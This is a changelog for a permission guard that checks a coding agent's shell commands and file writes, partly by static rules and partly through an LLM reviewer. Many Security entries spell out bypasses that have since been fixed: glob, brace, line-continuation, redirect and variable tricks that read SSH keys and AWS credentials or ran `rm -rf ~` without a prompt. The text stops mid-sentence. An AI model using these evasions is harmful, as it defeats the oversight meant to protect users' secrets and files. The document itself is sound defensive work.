# Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Security

- Input redirects are path reads however they are spelled. `wc -l <f`, `sort 3<f`, `cat 0<f`, `<f cmd`, `echo ok<f` and `cat <>f` now get the sensitive-path and outside-project checks of `cat < f`: before, `wc -l <notes.txt` in a sensitive directory was allowed and `wc -l <~/.ssh/id_rsa` only asked on the basename. The file of any input redirect is read-checked whatever the command, `<>` is a read and a write on stdin (it no longer drops a following pipe), a program read from a `<>` stdin asks, and `<&N` names no file. Here-strings, heredocs and arithmetic `<` are unchanged.
- No option or script grammar takes an input redirect for an argument: `awk -v <~/.ssh/id_rsa x=1 '{print}'` (and its spaced form, allowed before) runs `awk -v x=1` with the key on stdin, so a command's input redirects are read after its arguments. Every file a brace target expands to is opened (`echo <>{a,~/.ssh/id_rsa}`), a `<` a variable's value supplies is an argument, not a redirect, a redirect after nested arithmetic (`$((1+((2)+3)))<f`) is seen, and a pipe composition rule (`read | exec`) no longer lowers a stage's block to an ask (`cat ~/.ssh/id_rsa | bash`).
- Preserve single-quoted shell text as literal until a nested program is parsed, so child shells use their exported environment and cannot hide catastrophic empty-variable targets.
- Check both GNU and POSIX readings of options after operands in sed/grep and GNU file writers; the strictest path check wins.
- **Line continuations are removed before nuh reads a token, and `$"…"` is
  read as bash reads it.** Bash and zsh drop a backslash-newline while
  reading input, inside double quotes too, but nuh removed it only between
  unquoted words: `cat "$HOME/.ss\<newline>h/id_rsa"` only asked on the
  basename, `cat "$HOME/.aw\<newline>s/creden\<newline>tials"` was allowed,
  and `echo $\<newline>(cat ~/.ssh/id_rsa)` hid the substitution.
  `shell_continuations` now takes out every continuation the shells remove
  (unquoted, in double quotes, backticks, `$((…))`, `${…}` and
  unquoted-delimiter heredoc bodies) before substitutions are found, at the
  top level and again in the text a `bash -c`, `eval`, heredoc program or
  substitution runs. One stays literal inside single quotes, `$'…'`, a
  comment and a quoted-delimiter heredoc body. A join that changes the
  context after it (`$\<newline>(`, `<\<newline><'EOF'`) is followed by a
  fresh scan, so the text after it is read as the shells read it. Bash's
  `$"…"` locale string is a double-quoted string with no translation, but
  nuh read `$"$HOME/.aws/credentials"` as `$$HOME/…` and allowed it, and
  `echo x > $"$HOME/.ssh/config"` was "inside project"; it is now read as
  `"…"` (zsh's reading, a literal `$` in front, is a relative path that
  reaches nothing bash's does not). `$$'x'` and `$$"x"` are the parameter
  `$$` before an ordinary string, no longer an ANSI-C or locale string.
- **Variables are assigned as bash and zsh assign them.** nuh tracks
  shell variables to read paths, but its model of assignment differed from
  the shells', so a later `cat "$Y"` was judged by the wrong value and
  allowed: `X=~/.ssh/id_rsa; export X=ok Y=$X; cat "$Y"` reads the key
  (a builtin expands all its arguments before it assigns any; plain
  `A=1 B=$A` still runs left to right). `command export`, `builtin
  export`, `noglob export`, `time export`, `declare -x`/`-r`/`-g` and a
  setter named by a variable were not seen as assignments at all. A
  prefix assignment before a builtin (`X=key export X`, `X=key :`) stays
  set in bash or POSIX sh, and one before a command (`X=key bash -c 'cat
  "$X"'`, `env X=key sh -c …`, through nohup, time, command, sudo and
  eval) reaches the program it runs; nuh dropped both. Where the shells
  differ (`command export` runs nothing in zsh) every value is kept and a
  later use is checked with each, strictest wins (`shell_walk.either`). A
  new shell sees only exported variables: one assigned but not exported,
  and not in nuh's environment, holds its value or nothing there
  (`X=src; bash <<'EOF'` running `rm -rf "$X"/` blocks). `unset X` empties
  X; `env -u`/`-i` empty what they remove. An option nuh does not model
  (`declare -i`, a nameref) leaves the names it sets unknown.
- Check written operands and output options for sed/awk, sort, diff, uniq, tree, tar, patch, mkfifo/mknod, split/csplit, dd, compressors, zip/unzip, downloads and local transfer destinations.
- Check the files that option values read (dd `if=`, tar `-T`, sort `--files0-from`, ...), including curl's `-F name=@FILE`/`<FILE`, `-d`/`-H @FILE`, `--data-urlencode name@FILE`, `-b FILE` and `-E CERT:PASS`, parsed rather than asked as unknown.
- **Braces are expanded before any path is checked.** The shell expands
  `{a,b}` before it reads a path, but nuh checked the brace word as one
  literal file in the working directory: `cat {,~/.aws/credentials}` and
  `rm -rf {x,~}` were allowed, `cat {a,~/.ssh/id_rsa}` only asked on the
  basename, and `echo x > {a,~/.claude/settings.json}` was "inside
  project". Every command word and redirect target is now brace-expanded
  as bash and zsh do it (`shell_braces`: comma lists, nested groups,
  numeric, zero-padded, stepped and letter sequences; tilde and variables
  then apply to each piece), so each piece gets the sensitive-path,
  credential, agent-hook, protected-write, catastrophic and project checks
  it would get written out, and the strictest wins. `{rm,-rf,~}` blocks as
  `rm -rf ~`. A redirect to several pieces writes each one (zsh's multios).
  Quoted braces stay literal, as do `{}` and `{x}`, a leading assignment
  and a here-string. Brace syntax nuh cannot read asks as unknown: an
  unmatched `{` or `}`, forms bash and zsh expand differently
  (`{a..e..2}`, `${x:-{a,b}}`, `$X{1,2}`) and more than 256 pieces. The
  one brace expander replaces `word_paths.braces`, so loop lists and
  project lifts read braces the same way.
- **A glob is checked by every path it can reach.** nuh checked a glob
  word by its literal spelling, so `cat ../.ss*/i*`, `cat ../.s?h/i*`,
  `cat ../.ss[[:alpha:]]/i*`, `cat ../.s*/**`, `cat ../.[sa][sw][hs]/*`,
  `cat ~+/../.ssh/i*` and zsh's `cat ../.ss(h)/i*` read `~/.ssh/id_rsa` (and
  `~/.aws/credentials`) with no prompt, while `cat ~/.ssh/id_rsa` blocked.
  A shell word (or inline-program string) holding glob syntax, or starting
  with `~+`/`~-`, now gets the sensitive, credential and protected-write
  checks for (1) its matches now, expanded from the working directory the
  command runs in (`..`, `~`, `~+`, `~-`, `~user`, POSIX classes, `**`,
  bash extglob, zsh grouping, qualifiers and extendedglob), and (2) every
  protected place its pattern could match from its
  literal prefix, matching or not (`glob_reach`, `glob_pattern`), so a glob
  cannot dodge the check by matching nothing yet. The strictest wins, and
  the floors fire through globs whatever the config: `cat ../.ss*/i*`
  blocks, `echo x > ../.ss*/config` blocks (ssh config), `rm -rf ~/.cl*`
  asks (agent hooks). What nuh cannot follow asks: `~-` before a `cd` it
  saw, a `..` after a glob component, zsh glob flags (`(#i)`). Quoted glob
  characters stay letters, and a glob lifts a user entry only when every
  match is inside the project. A leading `*`, `?` or bracket expression
  matches no dot-name, as in bash and zsh by default (dotglob and globdots
  are off in the agent's shell), so `ls ~/*` still allows; the command is
  read with them on when anything in it may turn them on (`shopt -s
  dotglob`, `setopt GLOB_DOTS` in any spelling, an option nuh cannot read,
  `GLOBIGNORE=`, `emulate`, `bash -O dotglob`, `zsh -o globdots`) or the
  glob ends in zsh's `(D)` qualifier (`glob_options`). A glob that spells
  the dot out reaches what it names: `cat ~/.bash*` asks on `~/.bashrc`,
  `ls ~/.config/*` on `~/.config/gh`.
- **The project boundary judges every operand a write changes.** A
  filesystem write or delete was judged by its last path operand only, so
  `rm ~/notes.txt ./x`, `touch /opt/x ./y` and `chmod 777 ~/bin/tool ./x`
  were allowed as "inside project". A table in `file_operands` now says
  which operands a command modifies: every one for rm, rmdir, unlink, shred,
  chmod, chown, chgrp, chattr, setfacl, touch, truncate, mkdir, tee and mv
  (mv removes its sources); the destination for cp, ln and install, whose
  sources are only read, except `install -d`, which creates every operand.
  `-t DIR` / `--target-directory` is that destination, so `cp -t ~/out ./a`
  asks and `cp -t ./out ~/a` is allowed. chattr's attribute change and
  setfacl's ACL spec are not files. The strictest operand decides; unlisted
  commands keep the last-operand check. chgrp, chattr and setfacl were not
  classified at all (unknown, ask everywhere) and are now filesystem_write.
- **`npx rimraf ~` is a recursive delete.** `rimraf` (and del-cli's
  `del-cli` and `del`) are in the full profile's filesystem_delete table. A
  package that `npx`, `npm exec`, `pnpm dlx`, `bunx`, `yarn dlx`, `uvx` or
  `pipx run` fetches was never classified as itself (the fetched package may
  not be the program its name says) and stayed package_run, allowed. Its
  name now counts when that is stricter: `npx rimraf ~` blocks as `rm -rf ~`
  does, `npx rimraf /etc/x` asks, and `npx rimraf ./dist` or `npx cat x`
  keep the runner's own classification.
- **`find -fprint FILE` is a write.** `-fprint`, `-fprint0`, `-fprintf` and
  `-fls` write the file they name, but find was a read unless it had
  `-delete` or `-exec`, so `find / -fprint /etc/passwd` was allowed. Those
  flags now make find a filesystem_write, with the usual path,
  sensitive-path and project checks.
- **`find / -exec mv {} /tmp \;` asks.** A write's context is its last
  operand, which for mv, cp or ln is the destination: `mv /{} /tmp` was
  judged by `/tmp` (trusted) and moving or copying everything find found
  under `/` or `~` was allowed. A `-exec`/`-execdir`/`-ok`/`-okdir` command
  that writes now also asks when a find root is outside the project. Roots
  in the project (`find . -exec mv {} ./out \;`) are unchanged.
- **Every static write check runs.** A write was decided by the first check
  that objected (path, then project boundary, then content), so an
  outside-project ask hid the content behind it: a write outside the
  project whose content your `content_patterns.policies` block asked instead
  of blocking. All three checks now run and the strictest wins.
- **Config can no longer remove a built-in sensitive path.**
  `sensitive_paths: {~/.aws: allow}` and `sensitive_basenames: {.env: allow}`
  removed built-in entries, `allow_paths` exempted them, and `profile: none`
  emptied both built-in lists, `~/.ssh`'s block included. Each such lowering
  now warns once naming the key and is ignored, and the built-in lists
  survive `profile: none`. Moving a built-in entry between `ask` and `block`
  still works. `nuh allow-path` on a built-in path refuses, and an ask from a
  built-in entry no longer suggests it. For what the LLM may lower, see the
  static floor under Added.
- **A provider's `timeout` bounds the whole request.** urllib applies its
  timeout to each socket operation, so a server that sent its headers or
  body a byte at a time kept a request alive far past the provider's
  `timeout`, until Claude Code killed the hook. The request now fails at its
  `timeout`, connect to last byte, as a socket timeout does, and
  `llm.on_failure` decides the call.
- **Shell parameters are unknown targets, not file names.** A path holding
  `$1`, `${1}`, `"$@"`, `$*`, `$0` or `$_` was read as a literal name in the
  working directory, so `sh -c 'rm "$1"' _ /opt/zz`, `find /opt/zz -exec sh
  -c 'rm "$1"' _ {} \;` and `echo x > "$1"` were allowed as trusted paths.
  nuh does not map `sh -c` arguments onto `$1`: such a target is unknown and
  asks, like a variable nuh cannot resolve (`rm "$X"`), wherever a path goes
  (delete, write, read, redirect, cd). So do `${!X}`, `${#X}`, `$[…]`, an
  uncomputed `$((…))`, and `$!` and `$-`, which can be empty (`$!` until a
  background job runs, `$-` in dash): `rm -rf "./$!"/*` is `rm -rf ./*`.
  `$$`, `$?` and `$#` are always digits and stay known
  (`rm -rf /tmp/build.$$` is unchanged). `$PWD` and `$OLDPWD` follow the
  cds nuh tracks instead of nuh's environment: `cd /usr/share && rm -rf
  "$PWD/x"` was allowed as a file in the project. Accepted cost: `sh -c 'rm
  "$1"' _ ./build` asks too. find's own path check leaves out its `-exec`
  payload words, which the payload checks itself, so an awk program's `$0`
  under `-exec awk '…'` is code, not a path.
- **A shell's `-c` counts only before its first operand.** Shell wrapper
  detection took a `-c` anywhere in the argument list, so `bash ./x.sh -c
  ls`, `bash /tmp/evil.sh -c ls` and `sh -e /tmp/evil.sh -c 'echo hi'` were
  allowed as `ls` or `echo hi` while bash ran the script with `-c ls` as its
  arguments. The same went for a here-string after a script (`bash ./x.sh
  <<< ls`), for several here-strings, where the shell runs the last one and
  nuh unwrapped the first, and for heredoc body lines such as `true -c ls`
  in `sh <<'EOF'`, which could hide `rm -rf ~/x` in the body. Wrapper
  detection now reads only the shell's own argv, with the same grammar the
  pipe rules use (`exec_source`): options end at the first operand or `--`,
  `-o`/`-O`/`--rcfile`/`--init-file` take their argument, clusters count
  (`-ec`, `-xec`, `-lc`, `-cl`), and `+x`/`+o NAME` turn an option off.
  Those forms now run the script, which asks when it is missing and is
  content-scanned when it exists. Argv nuh cannot read is no wrapper and
  asks; it is never taken for the inner command. Accepted cost: `bash -i -c
  …` and long options nuh does not list ask instead of unwrapping.
- **A failed LLM review asks.** An exception in nuh's own LLM step (building
  the prompt, reading the transcript) was swallowed as "no verdict", and so
  was a cascade in which every provider errored (unreachable, timeout,
  missing key, bad reply). On a call whose allow rests on the review, a
  clean script file run by Bash or any write while the LLM is on, the static
  allow then stood unreviewed. Both are now a failed review, which
  `llm.on_failure` decides (ask by default): the error goes to stderr
  (`nuh: llm: …`; a missing key reads `nuh: LLM: OPENROUTER_API_KEY not
  set`) and into the log as `llm.skipped: error` with `llm.error` (shown by
  `nuh log`, `-v` and `--errors`; a cascade in which no provider was tried
  logs `provider: (none)`). A config that cannot be read no longer skips the
  write review.
- **An LLM block on a statically allowed call asks.** The default
  `llm.max_decision: ask` capped an LLM block to ask, and on a Bash call the
  static layer allowed (a clean script file, which the LLM still reviews)
  the hook then kept the allow and dropped that ask. An LLM verdict stricter
  than the static decision now always applies, after the cap
  (`llm.can_block`): a capped block asks, and with `llm.can_block: true` it
  blocks.
- **Claude Code sends WebFetch and WebSearch to nuh.** The Claude Code
  matchers left them out, so nuh never saw them. Without a `classify` entry
  they are `unknown` and ask; their `tools` word is `defer` unless you set
  one. Run `nuh update` to add the matchers to an existing install.

### Changed

- System 1 preamble names a fixed owner ("Sam") instead of the maintainer; a named owner keeps the model's caution (calibrated: decisions unchanged within noise, while generic wording loosened them).
- **Notices carry no confidence numbers.** System 1's reason was `system1: ask p=0.97; …` (with `(0.81)` on other triggers and `uncertain (allow 0.52)`); it is now `system1: ask; plausible, but a human should glance at it`, and `uncertain (allow)`. The probabilities stay in the log's question steps (`nuh log -v`, `nuh trace`); a detailed choice option's rule now shows its probability (`p(risky)=0.42 >= 0.3`).
- **`nuh install` writes the zsh completion.** pipx links man pages but
  never shell completions, so only `make install` used to write `_nuh`.
  `nuh install` now writes it once per user, whichever `--agent`: into
  oh-my-zsh's completions directory when there is one (`ZSH_CACHE_DIR`
  asked of an interactive zsh, then `$ZSH/cache`, then
  `~/.oh-my-zsh/cache`), else into
  `${XDG_DATA_HOME:-~/.local/share}/zsh/site-functions`, printing the
  `fpath=(...)` line to add to `~/.zshrc` when that directory is not on
  `fpath` (it never edits the file). Atomic (temp file and rename), mode
  644; without zsh it is skipped with a note. `--no-completion` skips it,
  `--completion-only` does only it. `nuh update` refreshes every `_nuh`
  nuh wrote (or writes one); `nuh uninstall` deletes them once no agent
  keeps nuh's hooks. A `_nuh` without nuh's generated header line is never
  overwritten or deleted. `make install` now runs `nuh install
  --completion-only` with the pipx copy instead of its own shell writer.
- **The CLI says when the zsh completion is missing.** For a zsh user
  (`$SHELL`) whose stderr is a terminal, with no nuh-written `_nuh` in
  the places `nuh install` writes to, `nuh` prints one line on stderr
  after any `--help` output and before every command except
  `completion`, `install`, `update` and `uninstall`, on every run until
  the completion exists. Never on stdout (pipes, `man nuh` and the
  generated docs stay clean), never from the hook, and it writes nothing.
  The check only stats paths (no zsh is started); the config is read
  only when the line would show. `completion_hint: false` (global only;
  a project `.nuh.yaml` setting warns and is ignored) hides it.
- **`make install` installs nuh itself; `make hook-install` installs the
  hook.** `make install` is now the pipx editable install with the man page
  and zsh completion; the hook install from the clone's `.venv` it used to
  run is `make hook-install`. `make update` runs `make install` and then
  `nuh update` with the pipx copy, so the installed hook runs the installed
  package; it used to rewrite the hook from the clone's `.venv`.
- **The CLI reference is generated from the parser.** Each command's
  section of `site/cli.md` (summary, synopsis, description, options,
  examples), the README's command list and the action type table in
  `site/configuration/actions.md` are rendered by `make docs`
  (`scripts/gen_cli_docs.py`) into marked blocks, and a test fails while a
  committed block differs from the render. The hand-written notes stay
  around them. This fixed drift the hand-written pages had: 20 action types
  (there are 26; the pages no longer state a count), `--agent` taking only
  `claude`, `db_write` defaulting to ask (it is `context`), five types
  missing from the table, `/nuh-demo --full` and `--story rce` (the
  command takes `full` and `story:remote_code_execution`), and
  `pip uninstall nuh` for a pipx install.
- **nah is now nuh.** Upstream `manuelschipper/nah` moved to Rust and this
  fork of its Python line no longer merges from it, so the fork took its own
  name: package and command `nuh` (`src/nuh`), hook script `nuh_guard.py`,
  config `~/.config/nuh` (log `~/.config/nuh/nuh.log`), project config
  `.nuh.yaml`, env vars `NUH_*`, and hook messages that start `nuh.` /
  `nuh?`. No transition support ships (pre-1.0): the old names are not read,
  and `nuh install` leaves hooks installed as `nah_guard.py` alone.
- **Breaking: gating is one word per tool (`tools:`) and one list of asks no
  LLM may lower (`human_only:`).** `tools: {<tool or glob>: defer | approve
  | check | decide}` says whether nuh's allow is sent and how far the LLM
  may weigh in: `check` reviews allows and may raise one (for Bash, a clean
  script file's allow), and `decide` also reviews asks and may lower one.
  `approve`, `check` and `decide` send an allow, `defer` leaves it silent so
  the agent's own permissions decide. Bash, Write and Edit default to
  `decide`; MultiEdit, NotebookEdit and apply_patch follow Edit; Read, Glob
  and Grep default to `approve`; any other tool to `defer`. A tool name is
  matched exactly, then by the longest glob. `human_only: {<key>: true |
  false}` names the floor rules, action types and content keys whose asks
  only you may lower: every floor rule and `content_secret`,
  `content_custom` and `content_too_large` are true by default, every action
  type false. Both keys are global only. They replace `active_allow` and
  `llm.eligible`. Under `decide` or `check`, a tool other than Bash and the
  write tools gets the generic review: the model sees the tool name and its
  input as JSON, cut at `llm.max_action_chars` with a marker saying how much
  it was shown. `nuh test` prints the tool's word and where it came from
  (`approve (config: mcp__forge__*)`), the human-only keys behind an ask,
  whether the LLM would be called and why not, and `Delivery:` (sent, or
  silent under `defer`); `nuh config show` prints both tables with where
  each value came from.
- **`llm.can_block` replaces `llm.max_decision`.** `can_block: false` (the
  default) caps an LLM block to ask; `true` lets it block. No cap weakens a
  verdict below ask: `max_decision: allow` turned the LLM's doubt into an
  approval. `nuh test` takes `--can-block` / `--no-can-block` and prints
  `can_block`; `nuh config show` prints `llm.can_block`.
- **An internal error asks by default (`hook.on_error`).** When nuh itself
  failed (a bug, a malformed payload, a config that will not load) it
  blocked the call. A crash means nuh could not classify the call, which nuh
  treats like any other call it cannot settle, so it now asks, with the
  error as the reason. The global setting `hook.on_error: ask | block |
  defer` chooses: `block` is the old behaviour (with a `💥` notice), and
  `defer` sends no decision so Claude Code's (or Codex's) own permission
  flow decides; nuh never sends an allow for a call it failed on. A project
  `.nuh.yaml` cannot set it (`hook.*` there warns and is ignored), an
  invalid value warns and asks, and a config that fails to load gives `ask`.
  The error is now in the decision log: the row holds what nuh answered,
  the error in the reason and in `internal_error`, and the tool and input
  as other rows have them (`unknown` when the payload could not be read).
- **PyYAML and cel-python are required.** `pip install nuh` installs both;
  the `config` extra is gone. Without PyYAML nah ignored your config, so a
  stricter setting silently did not apply. Both are imported only where
  used, so a hook call with no config file and no system 1 gate starts on
  the standard library alone.
- **A model's ask is a permission prompt, on Bash as on writes.** A provider
  may answer allow, ask, block or uncertain. An ask asks wherever that is
  stricter than the static decision: on Bash an uncertain answer used to
  keep the static allow of a clean script while writes asked. An uncertain
  answer is now decided by `llm.on_uncertain` (see Added).
- **No LLM call for an ask no verdict could change.** A static ask skips the
  LLM step, instead of waiting up to the whole LLM budget, when a
  `human_only` key is behind it or the tool's word is not `decide`. For an
  apply_patch, a part no review sees that asks, with `llm.can_block: false`,
  skips every review. The log records the skip as `llm.skipped: no_effect`
  with `llm.skip_reason` (`cannot change outcome (human_only: …)`), `nuh log
  --llm` leaves those entries out, and `nuh test` prints the skip.
- **The LLM reviewer sees the whole action.** The 500-character command cut,
  the 8192-character script and Write cuts and the Edit halves are gone;
  padding can no longer push a payload out of view. The program a lang_exec
  stage runs without a file (`python3 -c`, `python3 - <<'EOF'`, `node
  <<EOF`, `python3 <<< …`, a script written earlier in the same command) is
  shown whole, labeled with its interpreter, source and content-scan
  result, and the prompt names what to look for: deleting or overwriting
  files outside the task, touching credentials or dotfiles, network sends,
  spawning shells or commands. Inner stages of unwrapped shells (`bash -c`,
  nested `sh -c`, `$(…)`) keep their own results, so a clean script file
  inside one is reviewed too. An action over `llm.max_action_chars`
  (default 48000) is not sent, and the decision is ask ("too large for LLM
  review", logged as `llm.skipped: too_large`). The whole prompt is capped
  by `llm.max_prompt_chars` (default 60000) and must fit the model: Ollama
  requests carry `options.num_ctx` (`llm.ollama.num_ctx`, default 24576),
  hosted providers have `llm.<provider>.max_prompt_tokens` (default 32768),
  and the smallest limit in the cascade applies. A prompt estimated not to
  fit is not sent; an Ollama `prompt_eval_count` at num_ctx, or far below
  the prompt's size, makes that attempt a provider error, and the cascade
  moves on. Conversation context gets what the prompt has left beside the
  action, dropping tool calls, then agent prose, then older user messages,
  then the subagent brief; only the required part (instructions, call
  metadata, the action) feeds the too-large check, so trimmed context never
  changes a verdict.
- **The LLM reviewer sees what the user asked for.** The conversation
  context dropped every typed prompt (Claude Code stores them as
  plain-string content) and read a fixed 48 KB tail, which one tool result
  could fill. `nuh.transcript` reads the transcript backward in chunks,
  stops once its sections are full (32 MB cap per file), and checks lines by
  substring before parsing them. The context has labeled sections with
  separate budgets under `llm.context`: the user's first message
  (`first_prompt_chars`, 1500), their last messages (`user_turns` 6,
  `user_chars` 4000), messages queued mid-turn, a subagent's brief marked as
  agent-written, a little agent prose (`assistant_chars` 1500) and recent
  tool calls (`tool_calls` 12). `llm.context_chars` (12000) is the overall
  cap. Harness injections are excluded and the call under review is left
  out (`tool_use_id`).
- **Secrets go to the reviewer raw unless a provider opts in to
  redaction.** Every prompt line holding a secret was replaced, which hid
  exactly what the reviewer looks for and let payloads hide inside
  key-shaped text. Write/Edit content and conversation context now reach
  the model raw; `llm.<provider>.redact_secrets: true` masks them for that
  provider, each secret replaced in place by `[redacted: <description>]`
  with the rest of the line visible. For a keyword pattern only the value
  is replaced (`api_key = "[redacted: hardcoded API key]"`), and no value
  holds whitespace or shell syntax. A private key block is replaced whole
  only when every line between its markers is key material (header lines
  such as `Version:` or `DEK-Info:`, then base64 lines of one width with an
  optional PGP checksum); otherwise only the markers go and the rest stays
  visible. A PuTTY `.ppk` goes whole only with its known fields and counted
  lines. The model's verdict on the masked prompt is its verdict; static
  secret checks on writes still run.
- **Secret detection: 48 patterns, 43 secret kinds.** The check that makes
  Write/Edit content ask, and that `redact_secrets` applies, lives in
  `secret_patterns.py`: private keys of every PEM kind (OpenSSH, EC, DSA and
  encrypted keys used to slip past the ask), PGP private key blocks, PuTTY
  `.ppk` files and age keys; AWS temporary key IDs, secret access keys and
  session tokens (env and ini names, `AWS_SECRET_KEY`, the AWS CLI's JSON
  `SecretAccessKey` / `SessionToken`, `--aws-secret-access-key`); every
  GitHub token kind, GitLab, Gitea OAuth secrets and Gitea tokens set next
  to a `GITEA…TOKEN` name; Anthropic, OpenAI (project, service account,
  admin and user keys included), OpenRouter, Groq, xAI, Hugging Face and
  Replicate keys; npm, PyPI, Docker Hub, Portainer and registry `auth`
  entries; Google, Azure, DigitalOcean, Vault, Tailscale, Stripe, Slack and
  SendGrid secrets; and `Authorization`, `X-API-Key` and `api-key` headers,
  as header lines or JSON / dict entries (`.mcp.json`). JSON web tokens and
  `scheme://user:password@host` passwords are redacted but never ask: they
  fill ordinary development config. Two descriptions changed, so a
  `content_patterns.suppress` entry naming the old one warns as unmatched:
  `AWS access key` is `AWS access key ID`, `GitHub personal access token`
  is `GitHub token`. `content_patterns.suppress` and `profile: none` stop
  only the ask: redaction always applies the whole table. Every pattern is
  linear and starts with its literal prefix where it has one.
- **Inline code is content-scanned.** `python3 -c`, `node -e`, `ruby -e`,
  `perl -e` and `php -r` asked unscanned. Their code now goes through the
  content scan: dangerous patterns ask or block, and clean inline code asks
  "content scan clean (needs an LLM verdict)", which the LLM may lower under
  `decide`. Heredoc and here-string programs (`python3 - <<'EOF'`, `node
  <<EOF`, `ruby -`, `perl -`, `python3 <<< "…"`) are inline code too: they
  used to ask "script not found: …/<<EOF", and `python3 < x.py` inspects
  `x.py`. Program text built from command substitution output
  (`python3 -c "$(cat x.py)"`) asks.
- **Write/Edit content inspection only where the text can run.** The
  destructive, exfiltration, credential-access and obfuscation patterns
  apply when the target is a script or source file, a file tools execute
  (Makefile, package.json, pyproject.toml, Dockerfile, YAML/TOML/INI config,
  CI, git hooks and config, shell rc files, systemd units, crontabs,
  `.env`), new content with a shebang, or an existing file that is
  executable or starts with one. Docs and data (`.md`, `.txt`, `.json` ...)
  no longer ask for mentioning `rm -rf`; running them later is still
  inspected. Secret patterns and the hidden-characters floor apply to every
  file. An ask names why the target runs.
- **Stricter static classification.** ssh `config`, `authorized_keys`, `rc`
  and `environment` writes block whatever a user `~/.ssh` entry says. A path
  argument built from a command substitution (`"$(echo ~)/x"`) is unknown.
  Bare file operands (`cat notes.txt`) are path-checked like
  `./notes.txt`, and the string literals of inline code are checked instead
  of its words.
- **`~/.config/tea` is a credential path**, asking like `~/.config/gh`.
  Gitea's CLI keeps bare 40-hex tokens in its `config.yml`, which no pattern
  can tell from a commit hash.
- **`nuh log` lists oldest first** (newest at the bottom, like `tail`; `-r`
  for newest first), and `--tool` ignores case.

### Removed

- **`trust_project_config` is gone.** It let a project's `.nuh.yaml` loosen
  `actions`, `sensitive_paths`, `sensitive_paths_default` and content
  policies, and its `classify` beat the built-ins, so a cloned repository
  could switch off nuh's checks. A project's config may now only tighten.
- **`active_allow`, `llm.eligible`, `llm.max_decision` and the `llm.backends`
  spelling of `llm.providers` are not read.** `tools:` and `human_only:`
  replace the first two, `llm.can_block` the third (see Changed). Set, each
  warns as an unknown key.

### Added

- **`man nuh`, `nuh completion zsh` and full `--help`, all from the one
  argparse tree.** Every command's `--help` has a description and
  examples (`cli_text`); `cli_parser` builds the parser without importing
  any handler, so `--help` and completion load neither the classifier nor
  the config. The man page is rendered when the wheel is built
  (`hatch_build.py`, editable wheels included) and installed as
  `share/man/man1/nuh.1`; it is never committed (`make man` renders a
  preview to `build/man/nuh.1`). `nuh completion zsh` prints a compsys
  function rendered from the live parser: commands, nested commands,
  options with their help, choices, paths, action types with their
  descriptions, tool names, providers and agents, every value rendered
  into the script (nothing calls back into nuh at TAB time). `nuh
  completion` classifies as a read. `make install` runs `pipx install
  --force --editable .` and writes the completion (see `nuh install`
  under Changed); the man page of an editable install changes only when
  `make install` runs again.
- **The static floor: verdicts neither the LLM nor config may lower.**
  Fifteen floor rules yield ask or block: `nuh_admin`, `project_config`,
  `agent_hooks`, `unguarded_launch`, `catastrophic`, `privilege`,
  `power_service`, `network_shell`, `credential_paths`, `sensitive_paths`,
  `git_exec`, `ssh_exec_options`, `hidden_chars`, `env_read` and
  `package_dir`. Every rule id is a
  `human_only` key, true by default, so the LLM is not asked about a floored
  ask; `human_only: {<rule>: false}` lets it decide that rule's asks, and
  blocks stay blocks. Config may make a floor stricter, never weaker:
  `actions` entries that would lower a floored type (`{nuh_admin: allow}`,
  `{env_read: allow}`) warn and are ignored, a global `classify` entry
  renaming `rm` or `printenv` keeps the floor nuh's own tables give the
  command, `protect_package` other than `true` warns, and `nuh allow
  nuh_admin` refuses. Every sensitive-path ask is floored (`sensitive_paths`),
  so the LLM no longer lowers one (with `llm.eligible: all` it could); a
  more specific rule outranks it. Environment dumps, printed credential
  variables and secret-manager reads are the new `env_read` type. Writes to
  the directory nuh runs from ask (`package_dir`); an editable install of a
  nuh checkout, and any install into the hook's own environment, is
  `nuh_admin`. Nested commands are unwrapped for floors whatever the
  profile or `classify` say: a floor in `find -exec`, a package runner or a
  `make` target fires, and a `find -exec` payload counts as a delete by
  nuh's own type for each command in it.
- **System 1 provider.** `system1` in `llm.providers` is not prompted: it
  POSTs the call's state and a set of questions to `<url>/v1/systemone`
  (default `http://localhost:11434`, model `nimble:9b`; plain http only to
  loopback, else https; `key_env` is sent as a bearer token; `keep_alive`
  passes through) and decides from the answers without a model-written
  verdict. The definition is `llm.system1.definition`, else
  `~/.config/nuh/system1.yaml`, else the shipped one; a bad definition fails
  the attempt and the cascade moves on. Questions are `noul` (a
  probability), `score` (a level) or `choice`, each with allow / ask / block
  thresholds; the strictest trigger wins and nothing triggered is
  uncertain. `gates:` are CEL expressions over the answers (`if: q.p > 0.8,
  then: block`). A `tools:` map, matched like the config's, merges a block
  onto the base for that tool (maps merge, lists replace, `null` removes a
  key). Context items: the user's messages, file lines, and
  `context.project`, `context.cwd_rel`, `context.git.branch` and
  `context.git.dirty` (a count), sent as JSON data in their own section,
  each computed only when asked for, each git call capped at 200 ms with
  fsmonitor, index writes, submodules and attribute filters off. Each
  question, gate and the provider call is a step in the log: `nuh log -v`
  and `nuh trace` show `destructive  noul 0.81 > 0.7 → block`,
  `net_and_risky → ask (not fired)`, `system1 nimble:9b 412ms ok`; a
  question that triggered names its `rule` (`> 0.7`, `p(risky) >= 0.3`,
  `top choice`, `between thresholds`, `no answer`).
- **`nuh system1 export [PATH]`** writes the shipped system 1 definition as
  YAML to edit by hand: block style, the preamble and instructions as
  literal blocks, a header comment saying the file replaces the shipped
  definition and is not updated on upgrade, and `based_on` set to the
  running version. The default path is the file nuh reads
  (`llm.system1.definition`, else `~/.config/nuh/system1.yaml`); an existing
  file needs `--force`, and `--stdout` prints instead. Writing asks under
  `nuh_admin`; `--stdout` is a read.
- **`nuh system1 check [PATH]`** validates a system 1 definition without a
  model call: the base and every `tools:` block load through the provider's
  own code (each key resolved as a tool name is), and its gates compile. It
  prints the file, context items, questions and how each decides, gates,
  each tool block, warnings (once each) and OK, or the error and exit 1. A
  gate reading a name that is not a question, such as one a tool block
  removed, is a warning. The default is the definition nuh uses now.
- **`llm.on_uncertain` and `llm.on_failure`** (`ask` | `static`, default
  `ask`, global only). Uncertain: a model looked and reached no decision.
  Failure: every provider errored, timed out or gave no usable reply, or
  nuh's LLM step crashed. `ask` makes the call an ask; `static` keeps the
  static decision. An invalid value warns and asks. An action too large to
  review always asks.
- **`llm.self_heal`** (default true, global only): a provider attempt that
  times out starts one detached worker for that provider, and the hook goes
  on without waiting for it. After a reboot Ollama has no model loaded, a
  cold load outlasts the provider timeout, and every review timed out
  without the model ever loading. The worker locks
